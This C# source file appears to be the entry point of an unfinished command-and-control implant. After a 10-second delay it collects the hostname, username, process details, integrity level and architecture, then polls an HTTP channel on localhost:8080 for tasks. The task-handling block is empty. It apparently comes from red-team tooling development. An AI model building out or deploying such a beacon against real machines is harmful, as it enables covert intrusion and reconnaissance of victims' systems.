using Agent.Models;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace Agent
{
    class Program
    {
        private static AgentMetadata _metadata;
        private static CommModule _commModule;
        private static CancellationTokenSource _tokenSource;

        static void Main(string[] args)
        {
            Thread.Sleep(10000);

            GenerateMetadata();

            _commModule = new HttpCommModule("localhost", 8080);
            _commModule.Init(_metadata);
            _commModule.Start();

            _tokenSource = new CancellationTokenSource();

            while (!_tokenSource.IsCancellationRequested)
            {
                if (_commModule.RecvData(out var tasks))
                {
                    
                }
            }
        }

        public void Stop()
        {
            _tokenSource.Cancel();
        }

        static void GenerateMetadata()
        {
            var process = Process.GetCurrentProcess();

            _metadata = new AgentMetadata
            {
                Id = Guid.NewGuid().ToString(),
                Hostname = Environment.MachineName,
                Username = Environment.UserName,
                ProcessName = process.ProcessName,
                ProcessId = process.Id,
                Integrity = TokenInformation.TokenInfo.GetProcessIntegrityLevel(process),
                Architecture = Environment.Is64BitOperatingSystem ? "x64" : "x86"
            };
        }
    }
}
